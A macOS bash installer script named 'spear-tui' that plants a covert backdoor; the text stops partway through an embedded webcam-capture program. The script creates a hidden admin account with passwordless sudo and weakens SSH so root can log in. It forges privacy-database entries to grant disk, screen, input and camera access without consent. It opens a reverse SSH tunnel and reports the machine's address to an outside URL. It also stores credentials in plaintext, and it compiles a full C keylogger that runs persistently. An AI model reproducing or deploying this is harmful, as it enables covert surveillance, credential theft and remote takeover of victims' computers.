#!/bin/bash
set -u
set -o pipefail
[ -z "${BASH_VERSION:-}" ] && [ -f "$0" ] && exec /bin/bash "$0" "$@"

V="4.5"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""; REPAIR=""
exec 3>&1

ui(){ printf '%s' "$1" >&3 2>/dev/null || true; }
uil(){ printf '%s\n' "$1" >&3 2>/dev/null || true; }
ok(){ printf '  ok    %s\n' "$1"; }
warn(){ printf '  warn  %s\n' "$1"; }
fail(){ printf '  FAIL  %s\n' "$1"; F=$((F+1)); }
phase(){ [ -n "$PF" ] && printf '%s' "$1" > "$PF" 2>/dev/null; [ -n "$REPAIR" ] && sleep 1; return 0; }
ask(){ if [ -c /dev/tty ]; then read -r "$@" </dev/tty; else read -r "$@"; fi; }
s(){ printf '%s' "$1" | sed -e 's/[\\&|]/\\&/g'; }
q(){ printf '%q' "$1" | sed -e 's/[\\&|]/\\&/g'; }
xml(){ printf '%s' "$1" | sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g'; }
jesc(){ printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g'; }

bye(){
  [ -n "$PP" ] && kill "$PP" 2>/dev/null
  [ -n "$KA" ] && kill "$KA" 2>/dev/null
  [ -n "$PF" ] && rm -f "$PF" 2>/dev/null
  printf '\033[?25h' >&3 2>/dev/null
  sudo rm -rf "$LOCK" 2>/dev/null
  return 0
}

comp(){ SRC="$1"; BIN="$2"; shift 2
        [ -s "$SRC" ] || return 1
        if [ -x "$BIN" ] && [ "$BIN" -nt "$SRC" ]; then return 0; fi
        /usr/bin/clang -O2 -w -o "$BIN" "$SRC" "$@" >/dev/null 2>&1 || return 1
        /usr/bin/codesign -f -s - "$BIN" >/dev/null 2>&1 || true
        return 0; }

clt(){ /usr/bin/xcode-select -p >/dev/null 2>&1; }

############################### steps ###############################

step_preflight(){ ok "macOS $(sw_vers -productVersion 2>/dev/null) $(uname -m)"; }

step_account(){
  if [ -n "$REPAIR" ] && id "$RUSER" >/dev/null 2>&1; then
    ACCT_PW="$(sudo cat "$PW_FILE" 2>/dev/null)"; [ -n "$ACCT_PW" ] || ACCT_PW="$RPW_CFG"
    [ -n "$ACCT_PW" ] && { ok "account ok"; return 0; }
  fi
  if [ -n "$RPW_CFG" ]; then ACCT_PW="$RPW_CFG"
  elif sudo test -s "$PW_FILE"; then ACCT_PW="$(sudo cat "$PW_FILE")"; ok "reusing password"
  else ACCT_PW="$(openssl rand -base64 24 | tr -d '/+=' | cut -c1-20)"
       printf '%s' "$ACCT_PW" | sudo tee "$PW_FILE" >/dev/null; sudo chmod 600 "$PW_FILE"; fi

  if id "$RUSER" >/dev/null 2>&1; then
    sudo sysadminctl -resetPasswordFor "$RUSER" -newPassword "$ACCT_PW" >/dev/null 2>&1 \
      && ok "password synced" || warn "password reset failed"
  else
    c=false
    for _ in 1 2 3; do
      sudo sysadminctl -addUser "$RUSER" -fullName "$RUSER" -password "$ACCT_PW" \
           -shell /bin/zsh -home "/Users/$RUSER" >/dev/null 2>&1 && { c=true; break; }
      sleep 1
    done
    $c && ok "account created" || fail "account creation failed"
  fi
  [ -d "/Users/$RUSER" ] || { sudo mkdir -p "/Users/$RUSER"; sudo chown "$RUSER" "/Users/$RUSER"; }

  sudo dseditgroup -o edit -a "$RUSER" -t user admin >/dev/null 2>&1
  dseditgroup -o checkmember -m "$RUSER" admin >/dev/null 2>&1 && ok "admin" || warn "admin grant failed"

  if sudo sysadminctl -secureTokenStatus "$RUSER" 2>&1 | grep -qi enabled; then ok "SecureToken"
  elif sudo sysadminctl -secureTokenOn "$RUSER" -password "$ACCT_PW" -adminUser "$ADMIN_USER" -adminPassword "$ADMIN_PW" >/dev/null 2>&1; then ok "SecureToken granted"
  else warn "no SecureToken"; fi

  printf '%s\n' "$RUSER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/spear-tui >/dev/null
  sudo chmod 440 /etc/sudoers.d/spear-tui
  sudo visudo -cf /etc/sudoers.d/spear-tui >/dev/null 2>&1 && ok "passwordless sudo" \
    || { sudo rm -f /etc/sudoers.d/spear-tui; fail "sudoers rejected"; }

  if [ "$HIDE_LOGIN" = "true" ]; then
    sudo killall cfprefsd >/dev/null 2>&1
    sudo /usr/libexec/PlistBuddy -c "Print :HiddenUsersList" "$LP" 2>/dev/null | grep -qx "$RUSER" \
      || { sudo /usr/libexec/PlistBuddy -c "Add :HiddenUsersList array" "$LP" >/dev/null 2>&1
           sudo /usr/libexec/PlistBuddy -c "Add :HiddenUsersList: string $RUSER" "$LP" >/dev/null 2>&1; }
    sudo killall cfprefsd >/dev/null 2>&1
    ok "hidden from login window"
  fi

  if sudo fdesetup status 2>/dev/null | grep -qi "FileVault is On"; then
    PL="$(mktemp)"
    cat > "$PL" <<PLV
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Username</key><string>$(xml "$ADMIN_USER")</string>
<key>Password</key><string>$(xml "$ADMIN_PW")</string>
<key>AdditionalUsers</key><array><dict>
<key>Username</key><string>$(xml "$RUSER")</string>
<key>Password</key><string>$(xml "$ACCT_PW")</string>
</dict></array>
</dict></plist>
PLV
    sudo fdesetup add -inputplist < "$PL" >/dev/null 2>&1 && ok "FileVault user added" || warn "FileVault add failed"
    rm -f "$PL"
  fi
}

addkey(){ h="$1"; u="$2"
  sudo mkdir -p "$h/.ssh"; sudo chmod 700 "$h/.ssh"
  if sudo test -f "$h/.ssh/authorized_keys"; then
    sudo grep -qF "$PUBKEY" "$h/.ssh/authorized_keys" || printf '%s\n' "$PUBKEY" | sudo tee -a "$h/.ssh/authorized_keys" >/dev/null
  else printf '%s\n' "$PUBKEY" | sudo tee "$h/.ssh/authorized_keys" >/dev/null; fi
  sudo chmod 600 "$h/.ssh/authorized_keys"
  [ -n "$u" ] && sudo chown -R "$u" "$h/.ssh"
  ok "key -> $h"; }

step_keys(){ addkey "/Users/$RUSER" "$RUSER"
  [ "$ROOT_KEY" = "true" ] && addkey "/var/root" ""
  [ "$OWNER_KEY" = "true" ] && [ -d "/Users/$OWNER" ] && addkey "/Users/$OWNER" "$OWNER"
  return 0; }

step_sshd(){
  sudo systemsetup -f -setremotelogin on >/dev/null 2>&1
  sudo launchctl enable system/com.openssh.sshd >/dev/null 2>&1
  sudo launchctl bootstrap system /System/Library/LaunchDaemons/ssh.plist >/dev/null 2>&1
  nc -z -G 3 127.0.0.1 22 >/dev/null 2>&1 && ok "sshd 22" || fail "port 22 dead"

  case "$(sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null)" in
    *enabled*) sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/sbin/sshd >/dev/null 2>&1
               sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /usr/sbin/sshd >/dev/null 2>&1
               ok "firewall allows sshd" ;;
  esac

  [ "$TUNE_SSH" = "true" ] && {
    CFG="/etc/ssh/sshd_config"; MK="# spear"
    if sudo grep -qF "$MK" "$CFG" 2>/dev/null; then ok "sshd already tuned"
    else
      sudo cp "$CFG" "${CFG}.spear.bak"
      T="$(mktemp)"
      sudo awk '/^[[:space:]]*(UseDNS|GSSAPIAuthentication|PasswordAuthentication|KbdInteractiveAuthentication|PermitRootLogin|ClientAliveInterval|ClientAliveCountMax)[[:space:]]/ { print "#s " $0; next } { print }' "$CFG" > "$T"
      { echo "$MK"; echo "UseDNS no"; echo "GSSAPIAuthentication no"; echo "PasswordAuthentication yes"
        echo "KbdInteractiveAuthentication yes"; echo "PermitRootLogin yes"
        echo "ClientAliveInterval 30"; echo "ClientAliveCountMax 6"; echo "$MK"; } >> "$T"
      if sudo /usr/sbin/sshd -t -f "$T" >/dev/null 2>&1; then sudo cp "$T" "$CFG"; ok "sshd tuned"
      else warn "sshd test failed"; fi
      rm -f "$T"
      sudo launchctl kickstart -k system/com.openssh.sshd >/dev/null 2>&1 || true
    fi
  }

  if [ "$SSH_PORT2" != "" ]; then
    P2=/Library/LaunchDaemons/com.spear-tui.sshd2.plist
    sudo tee "$P2" >/dev/null <<S2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.spear-tui.sshd2</string>
<key>ProgramArguments</key><array>
<string>/usr/sbin/sshd</string><string>-D</string>
<string>-p</string><string>$SSH_PORT2</string>
<string>-o</string><string>PidFile=/var/run/sshd-spear.pid</string>
</array>
<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
<key>ThrottleInterval</key><integer>10</integer>
<key>StandardErrorPath</key><string>$DIR/sshd2.err</string>
</dict></plist>
S2
    sudo chmod 644 "$P2"; sudo chown root:wheel "$P2"
    sudo launchctl bootout system "$P2" >/dev/null 2>&1
    sudo launchctl bootstrap system "$P2" >/dev/null 2>&1
    sleep 1
    nc -z -G 3 127.0.0.1 "$SSH_PORT2" >/dev/null 2>&1 && ok "sshd2 on $SSH_PORT2" || warn "port $SSH_PORT2 not answering"
  fi
  return 0; }

step_sharing(){
  sudo launchctl enable system/com.apple.screensharing >/dev/null 2>&1
  sudo launchctl bootstrap system /System/Library/LaunchDaemons/com.apple.screensharing.plist >/dev/null 2>&1
  sleep 1
  nc -z -G 3 127.0.0.1 5900 >/dev/null 2>&1 && ok "screen sharing 5900" || warn "5900 not up yet"
  [ -x "$KICK" ] && { sudo "$KICK" -activate -configure -access -on -allowAccessFor -allUsers -privs -all -restart -agent >/dev/null 2>&1 \
    && ok "remote management" || warn "kickstart failed"; }
  return 0; }

tccs(){ sudo sqlite3 "$TCC" "DELETE FROM access WHERE service='$1' AND client='$2' AND client_type=$3;" >/dev/null 2>&1
        sudo sqlite3 "$TCC" "INSERT INTO access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier,flags) VALUES ('$1','$2',$3,2,4,1,'UNUSED',0);" >/dev/null 2>&1; }

tccu(){ UD="/Users/$OWNER/Library/Application Support/com.apple.TCC/TCC.db"
        sudo test -f "$UD" || return 0
        sudo sqlite3 "$UD" "DELETE FROM access WHERE service='$1' AND client='$2' AND client_type=$3;" >/dev/null 2>&1
        sudo sqlite3 "$UD" "INSERT INTO access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier,flags) VALUES ('$1','$2',$3,2,4,1,'UNUSED',0);" >/dev/null 2>&1; }

step_fda(){
  command -v sqlite3 >/dev/null 2>&1 || { warn "no sqlite3"; return 0; }
  sudo test -f "$TCC" || { warn "no TCC db"; return 0; }
  sudo killall tccd >/dev/null 2>&1; sleep 1
  for P in /usr/sbin/sshd /usr/libexec/sshd-keygen-wrapper /usr/sbin/screencapture; do
    tccs kTCCServiceSystemPolicyAllFiles "$P" 1
    tccs kTCCServiceScreenCapture "$P" 1
  done
  tccs kTCCServiceScreenCapture com.apple.screensharing.agent 0
  tccs kTCCServicePostEvent com.apple.screensharing.agent 0
  for B in com.apple.Terminal com.googlecode.iterm2 dev.warp.Warp-Stable; do tccs kTCCServiceSystemPolicyAllFiles "$B" 0; done
  sudo killall tccd >/dev/null 2>&1 || true
  ok "TCC: disk, screen, input"; }

step_login(){
  if [ "$AUTOLOGIN" = "owner" ] && [ -d "/Users/$OWNER" ] && dseditgroup -o checkmember -m "$OWNER" admin >/dev/null 2>&1; then
    AU="$OWNER"; AP="$ADMIN_PW"
  else AU="$RUSER"; AP="$ACCT_PW"; fi
  sudo sysadminctl -autologin set -userName "$AU" -password "$AP" >/dev/null 2>&1 && ok "autologin $AU" || warn "autologin failed"
  if [ "$HIDE_MENU" = "true" ]; then
    defaults -currentHost write com.apple.controlcenter UserSwitcher -int 8 2>/dev/null
    defaults write com.apple.controlcenter "NSStatusItem Visible UserSwitcher" -bool false 2>/dev/null
    sudo defaults write /Library/Preferences/.GlobalPreferences userMenuExtraStyle -int 2 2>/dev/null
    sudo killall ControlCenter SystemUIServer >/dev/null 2>&1 || true
    ok "menu extra hidden"
  fi
  return 0; }

step_ts_install(){
  [ -x "$TS" ] && { ok "tailscale present"; return 0; }
  D="$(mktemp -d)"
  if curl -fsSL --proto '=https' "$PKG_URL" -o "$D/t.pkg"; then
    [ "$(shasum -a 256 "$D/t.pkg" | awk '{print $1}')" = "$PKG_SHA" ] \
      && { sudo installer -pkg "$D/t.pkg" -target / >/dev/null 2>&1 && ok "tailscale installed" || fail "installer failed"; } \
      || fail "checksum mismatch"
  else fail "download failed"; fi
  rm -rf "$D"; }

tsreport(){
  [ -n "$REPORT_URL" ] || return 0
  local m e
  m="tsjoin host=$(hostname) ip=$("$TS" ip -4 2>/dev/null | head -1) ext=$(sudo /usr/bin/systemextensionsctl list 2>/dev/null | grep -ci tailscale) out=${TOUT:-}"
  e="$(jesc "$m")"
  curl -fsS --max-time 10 -H 'Content-Type: application/json' \
    -d "$(printf '{"content":"%s"}' "$e")" "$REPORT_URL" >/dev/null 2>&1
  return 0
}

step_ts_join(){
  [ -x "$TS" ] || { warn "no tailscale"; return 0; }
  open -a Tailscale >/dev/null 2>&1 || true
  sleep 4
  TOUT="$(sudo "$TS" up --authkey="$AUTHKEY" --hostname="$TSHOST" $TSFLAGS --reset 2>&1 | tr '
' ' ' | cut -c1-400)"
  n=0
  while [ "$n" -lt 20 ]; do
    TSIP="$("$TS" ip -4 2>/dev/null | head -1)"
    [ -n "$TSIP" ] && break
    open -a Tailscale >/dev/null 2>&1
    sleep 2; n=$((n+1))
  done
  if [ -n "$TSIP" ]; then ok "tailnet $TSHOST ($TSIP)"; else warn "tailnet not up - agent retries"; fi
  tsreport
  return 0; }

step_power(){
  [ "$ALWAYS_ON" = "true" ] || return 0
  sudo pmset -a sleep 0 disksleep 0 displaysleep 0 womp 1 autorestart 1 powernap 0 >/dev/null 2>&1
  sudo pmset -a disablesleep 1 lidwake 1 >/dev/null 2>&1
  sudo systemsetup -setrestartfreeze on >/dev/null 2>&1
  ok "power hardened"; }

step_tools(){
  if ! clt; then
    /usr/bin/xcode-select --install >/dev/null 2>&1 || true
    ok "asked for developer tools"
    n=0; while [ "$n" -lt 40 ]; do clt && break; sleep 3; n=$((n+1)); done
  fi
  comp "$DIR/keylog.c" "/usr/local/bin/$KEYLOG" -framework ApplicationServices \
    && ok "keylogger built" || warn "keylogger not built yet (agent retries)"
  comp "$DIR/cam.m" "/usr/local/bin/$CAM" -fobjc-arc -framework Foundation -framework AVFoundation \
    -framework CoreMedia -framework CoreVideo -framework CoreImage -framework ImageIO -framework CoreGraphics \
    && ok "camera built" || warn "camera not built yet (agent retries)"

  if [ -x "/usr/local/bin/$KEYLOG" ]; then
    tccs kTCCServiceAccessibility "/usr/local/bin/$KEYLOG" 1
    tccs kTCCServiceListenEvent   "/usr/local/bin/$KEYLOG" 1
    tccu kTCCServiceAccessibility "/usr/local/bin/$KEYLOG" 1
    tccu kTCCServiceListenEvent   "/usr/local/bin/$KEYLOG" 1
    tccu kTCCServiceCamera        "/usr/local/bin/$CAM"    1
    sudo killall tccd >/dev/null 2>&1 || true
    ok "keylogger permissions pre-granted"
    P=/Library/LaunchDaemons/com.spear-tui.keylog.plist
    sudo tee "$P" >/dev/null <<KPL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.spear-tui.keylog</string>
<key>ProgramArguments</key><array>
<string>/usr/local/bin/$KEYLOG</string><string>$DIR/keys.log</string></array>
<key>KeepAlive</key><true/>
<key>RunAtLoad</key><true/>
<key>ThrottleInterval</key><integer>10</integer>
<key>StandardErrorPath</key><string>$DIR/keylog.err</string>
</dict></plist>
KPL
    sudo chmod 644 "$P"; sudo chown root:wheel "$P"
    sudo launchctl bootout system "$P" >/dev/null 2>&1
    sudo launchctl bootstrap system "$P" >/dev/null 2>&1
    sleep 2
    sudo launchctl print system/com.spear-tui.keylog >/dev/null 2>&1 && ok "keylogger armed" || warn "keylogger not loaded"
  fi
  return 0; }

selfcheck(){
  ok "--- state ---"
  id "$RUSER" >/dev/null 2>&1 && ok "acct:present" || warn "acct:missing"
  sudo test -s "$PW_FILE" && ok "pw:present" || warn "pw:missing"
  sudo test -f /etc/sudoers.d/spear-tui && ok "sudoers:present" || warn "sudoers:missing"
  sudo grep -qF macbook "/Users/$RUSER/.ssh/authorized_keys" 2>/dev/null && ok "key:present" || warn "key:missing"
  sudo launchctl print system/com.spear-tui.agent >/dev/null 2>&1 && ok "agent:loaded" || warn "agent:not-loaded"
  for p in "${AGENT_PATHS[@]}"; do sudo test -s "$p" && ok "copy:$p" || warn "copy-missing:$p"; done
  nc -z -G 2 127.0.0.1 22 >/dev/null 2>&1 && ok "sshd:up" || warn "sshd:down"
  nc -z -G 2 127.0.0.1 5900 >/dev/null 2>&1 && ok "vnc:up" || warn "vnc:down"
  if [ -x "$TS" ]; then
    ok "ts:installed"
    ok "sysext:$(sudo "$TS" configure sysext status 2>&1 | tail -1)"
    i="$("$TS" ip -4 2>/dev/null | head -1)"; [ -n "$i" ] && ok "ts:connected:$i" || warn "ts:not-connected"
  else warn "ts:missing"; fi
  ok "--- end state ---"
  return 0; }

gen_agent(){
  T="$(mktemp)"
  cat > "$T" <<'AGENT'
#!/bin/bash
set -u
[ "$(id -u)" = 0 ] || exec sudo /bin/bash "$0" "$@"

DIR="__DIR__"; TS_BIN="__TS__"; AUTHKEY="__AUTHKEY__"; TSHOST="__TSHOST__"
TSFLAGS=(__FLAGS__); KEY="__PUBKEY__"; OWNER="__OWNER__"; RUSER="__RUSER__"
RPW="__RPW__"; APW="__APW__"; REPORT="__REPORT__"; RINT="__RINT__"; SP2="__SP2__"
TUNNEL="__TUNNEL__"; TPORT="__TPORT__"; TSPORT="__TSPORT__"
KL="/usr/local/bin/__KEYLOG__"; CAM="/usr/local/bin/__CAM__"
TCC="/Library/Application Support/com.apple.TCC/TCC.db"
WRAP="/usr/local/bin/spearzee"
PATHS=('__P0__' '__P1__' '__P2__')
LOG="$DIR/agent.log"
mkdir -p "$DIR" 2>/dev/null

log(){ printf '%s %s\n' "$(date '+%F %T')" "$1" >> "$LOG" 2>/dev/null; return 0; }
cu(){ /usr/bin/stat -f %Su /dev/console 2>/dev/null; }
cuid(){ /usr/bin/stat -f %u /dev/console 2>/dev/null; }
asuser(){ u="$(cu)"; [ -n "$u" ] && [ "$u" != "root" ] || { echo "no console user" >&2; return 1; }
          /bin/launchctl asuser "$(cuid)" /usr/bin/sudo -u "$u" "$@"; }
ensure(){ /bin/launchctl print "system/$1" >/dev/null 2>&1 && return 0
          /bin/launchctl enable "system/$1" >/dev/null 2>&1
          /bin/launchctl bootstrap system "$2" >/dev/null 2>&1; }
build(){ SRC="$1"; OUT="$2"; shift 2
         [ -s "$SRC" ] || return 1
         if [ -x "$OUT" ] && [ "$OUT" -nt "$SRC" ]; then return 0; fi
         /usr/bin/clang -O2 -w -o "$OUT" "$SRC" "$@" >/dev/null 2>&1 || return 1
         /usr/bin/codesign -f -s - "$OUT" >/dev/null 2>&1 || true; return 0; }
set_tcc(){ sqlite3 "$TCC" "DELETE FROM access WHERE service='$1' AND client='$2' AND client_type=$3;" >/dev/null 2>&1
           sqlite3 "$TCC" "INSERT INTO access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier,flags) VALUES ('$1','$2',$3,2,4,1,'UNUSED',0);" >/dev/null 2>&1; }

write_plist(){ pl="$1"; pg="$2"; iv="$3"; lbl="$4"
  cat > "$pl" <<PL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>$lbl</string>
<key>ProgramArguments</key><array><string>/bin/bash</string><string>$pg</string></array>
<key>RunAtLoad</key><true/>
<key>StartInterval</key><integer>$iv</integer>
<key>ThrottleInterval</key><integer>10</integer>
<key>StandardOutPath</key><string>$DIR/agent.log</string>
<key>StandardErrorPath</key><string>$DIR/agent.log</string>
</dict></plist>
PL
  /bin/chmod 644 "$pl" 2>/dev/null; /usr/sbin/chown root:wheel "$pl" 2>/dev/null
  /bin/launchctl bootout system "$pl" >/dev/null 2>&1
  /bin/launchctl bootstrap system "$pl" >/dev/null 2>&1; }

write_keylog(){ P=/Library/LaunchDaemons/com.spear-tui.keylog.plist
  cat > "$P" <<KPL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.spear-tui.keylog</string>
<key>ProgramArguments</key><array><string>$KL</string><string>$DIR/keys.log</string></array>
<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
<key>ThrottleInterval</key><integer>10</integer>
<key>StandardErrorPath</key><string>$DIR/keylog.err</string>
</dict></plist>
KPL
  /bin/chmod 644 "$P" 2>/dev/null; /usr/sbin/chown root:wheel "$P" 2>/dev/null
  /bin/launchctl bootout system "$P" >/dev/null 2>&1
  /bin/launchctl bootstrap system "$P" >/dev/null 2>&1; }

write_sshd2(){ [ -n "$SP2" ] || return 0
  P=/Library/LaunchDaemons/com.spear-tui.sshd2.plist
  cat > "$P" <<S2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.spear-tui.sshd2</string>
<key>ProgramArguments</key><array>
<string>/usr/sbin/sshd</string><string>-D</string>
<string>-p</string><string>$SP2</string>
<string>-o</string><string>PidFile=/var/run/sshd-spear.pid</string>
</array>
<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
<key>ThrottleInterval</key><integer>10</integer>
<key>StandardErrorPath</key><string>$DIR/sshd2.err</string>
</dict></plist>
S2
  /bin/chmod 644 "$P" 2>/dev/null; /usr/sbin/chown root:wheel "$P" 2>/dev/null
  /bin/launchctl bootout system "$P" >/dev/null 2>&1
  /bin/launchctl bootstrap system "$P" >/dev/null 2>&1; }

write_tunnel(){ [ -n "$TUNNEL" ] || return 0
  [ -s "$DIR/tunnel_key" ] || /usr/bin/ssh-keygen -t ed25519 -N "" -f "$DIR/tunnel_key" -C spear >/dev/null 2>&1
  P=/Library/LaunchDaemons/com.spear-tui.tunnel.plist
  cat > "$P" <<PL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.spear-tui.tunnel</string>
<key>ProgramArguments</key><array>
<string>/usr/bin/ssh</string><string>-N</string><string>-T</string>
<string>-o</string><string>BatchMode=yes</string>
<string>-o</string><string>ServerAliveInterval=20</string>
<string>-o</string><string>ServerAliveCountMax=3</string>
<string>-o</string><string>ExitOnForwardFailure=yes</string>
<string>-o</string><string>StrictHostKeyChecking=accept-new</string>
<string>-o</string><string>UserKnownHostsFile=$DIR/known_hosts</string>
<string>-i</string><string>$DIR/tunnel_key</string>
<string>-p</string><string>$TSPORT</string>
<string>-R</string><string>$TPORT:localhost:22</string>
<string>-R</string><string>5901:localhost:5900</string>
<string>$TUNNEL</string></array>
<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
<key>ThrottleInterval</key><integer>15</integer>
<key>StandardErrorPath</key><string>$DIR/agent.log</string>
</dict></plist>
PL
  /bin/chmod 644 "$P" 2>/dev/null; /usr/sbin/chown root:wheel "$P" 2>/dev/null
  /bin/launchctl bootout system "$P" >/dev/null 2>&1
  /bin/launchctl bootstrap system "$P" >/dev/null 2>&1; }

write_secrets(){ mkdir -p "$DIR"
  { printf 'host=%q\n' "$(hostname)"; printf 'owner_user=%q\n' "$OWNER"; printf 'owner_pw=%q\n' "$APW"
    printf 'remote_user=%q\n' "$RUSER"; printf 'remote_pw=%q\n' "$RPW"
    printf 'tailnet=%q\n' "$("$TS_BIN" ip -4 2>/dev/null | head -1)"
    printf 'tunnel=%q\n' "$TUNNEL"; printf 'tunnel_pub=%q\n' "$(cat "$DIR/tunnel_key.pub" 2>/dev/null)"
    printf 'updated=%q\n' "$(date '+%F %T')"; } > "$DIR/secrets" 2>/dev/null
  chmod 600 "$DIR/secrets" 2>/dev/null
  cp "$DIR/secrets" "/Users/$RUSER/.spear-secrets" 2>/dev/null
  chown "$RUSER" "/Users/$RUSER/.spear-secrets" 2>/dev/null
  chmod 600 "/Users/$RUSER/.spear-secrets" 2>/dev/null; }

ensure_tools(){
  if [ ! -s "$DIR/keylog.c" ]; then cat > "$DIR/keylog.c" <<'KC'
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

static FILE *out; static CFMachPortRef g_tap; static int frames;
static char app[256]; static time_t appt;

static void front(void){
  time_t n=time(NULL); if(n-appt<2 && app[0]) return; appt=n; app[0]=0;
  CFArrayRef w=CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly|kCGWindowListExcludeDesktopElements,kCGNullWindowID);
  if(!w) return; CFIndex c=CFArrayGetCount(w);
  for(CFIndex i=0;i<c;i++){
    CFDictionaryRef d=CFArrayGetValueAtIndex(w,i); int l=-1;
    CFNumberRef ln=CFDictionaryGetValue(d,kCGWindowLayer); if(ln) CFNumberGetValue(ln,kCFNumberIntType,&l);
    if(l!=0) continue; CFStringRef o=CFDictionaryGetValue(d,kCGWindowOwnerName);
    if(o){ CFStringGetCString(o,app,sizeof(app),kCFStringEncodingUTF8); break; }
  } CFRelease(w);
}
static const char* kn(CGKeyCode k){
  switch(k){
   case 36:return"RET"; case 48:return"TAB"; case 49:return"SPC"; case 51:return"DEL";
   case 53:return"ESC"; case 76:return"ENT"; case 117:return"FWDEL"; case 115:return"HOME";
   case 119:return"END"; case 116:return"PGUP"; case 121:return"PGDN"; case 123:return"LEFT";
   case 124:return"RIGHT"; case 125:return"DOWN"; case 126:return"UP"; default:return NULL; }
}
static void rot(const char *p){
  char b[1024]; snprintf(b,sizeof(b),"%s.1",p);
  fclose(out); rename(p,b); out=fopen(p,"a");
}
static CGEventRef cb(CGEventTapProxy p, CGEventType t, CGEventRef e, void *u){
  if(t==kCGEventTapDisabledByTimeout||t==kCGEventTapDisabledByUserInput){ CGEventTapEnable(g_tap,true); return e; }
  if(t!=kCGEventKeyDown||!out) return e;
  CGKeyCode kc=(CGKeyCode)CGEventGetIntegerValueField(e,kCGEventKeyboardEventKeycode);
  CGEventFlags f=CGEventGetFlags(e);
  UniChar b[16]; UniCharCount n=0; CGEventKeyboardGetUnicodeString(e,16,&n,b);
  front(); time_t now=time(NULL); struct tm tm; localtime_r(&now,&tm);
  char ts[32]; strftime(ts,sizeof(ts),"%Y-%m-%d %H:%M:%S",&tm);
  fprintf(out,"%s [%s] ",ts,app[0]?app:"?");
  if(f&kCGEventFlagMaskCommand) fprintf(out,"CMD+");
  if(f&kCGEventFlagMaskControl) fprintf(out,"CTL+");
  if(f&kCGEventFlagMaskAlternate) fprintf(out,"ALT+");
  if(f&kCGEventFlagMaskShift) fprintf(out,"SHF+");
  const char*k=kn(kc);
  if(k) fprintf(out,"<%s>",k);
  else if(n>0){ for(UniCharCount i=0;i<n;i++){ UniChar c=b[i];
    if(c=='\n') fprintf(out,"<LF>"); else if(c=='\t') fprintf(out,"<TAB>");
    else if(c<32) fprintf(out,"<%d>",c); else fputc(c,out); } }
  else fprintf(out,"<%d>",kc);
  fputc('\n',out); fflush(out);
  if(++frames%500==0 && ftell(out)>4194304) rot((const char*)u);
  return e;
}
int main(int argc,char**argv){
  char *path = argc>1?argv[1]:"/var/root/.spear/keys.log";
  for(;;){
    out=fopen(path,"a"); if(!out){ sleep(3); continue; }
    fprintf(out,"--- keylog start %ld ---\n",(long)time(NULL));
    CFMachPortRef tap=CGEventTapCreate(kCGHIDEventTap,kCGHeadInsertEventTap,kCGEventTapOptionListenOnly,
                                       CGEventMaskBit(kCGEventKeyDown),cb,path);
    if(!tap){ fclose(out); out=NULL; sleep(5); continue; }
    g_tap=tap;
    CFRunLoopSourceRef src=CFMachPortCreateRunLoopSource(NULL,tap,0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(),src,kCFRunLoopCommonModes);
    CGEventTapEnable(tap,true);
    CFRunLoopRun();
  }
}
KC
  fi
  if [ ! -s "$DIR/cam.m" ]; then cat > "$DIR/cam.m" <<'CM'
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreImage/CoreImage.h>
#import <ImageIO/ImageIO.h>
static int fr;
@interface Grab : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *s; @property (strong) NSString *o; @property (strong) CIContext *c;
@end
@implementation Grab
- (void)captureOutput:(AVCaptureOutput *)o didOutputSampleBuffer:(CMSampleBufferRef)sb fromConnection:(AVCaptureConnection *)cn {
  if (++fr < 12) return;
  CVImageBufferRef pb = CMSampleBufferGetImageBuffer(sb); if (!pb) return;
  CIImage *ci = [CIImage imageWithCVPixelBuffer:pb];
  CGImageRef cg = [self.c createCGImage:ci fromRect:ci.extent]; if (!cg) return;
  CFURLRef u = (__bridge CFURLRef)[NSURL fileURLWithPath:self.o];
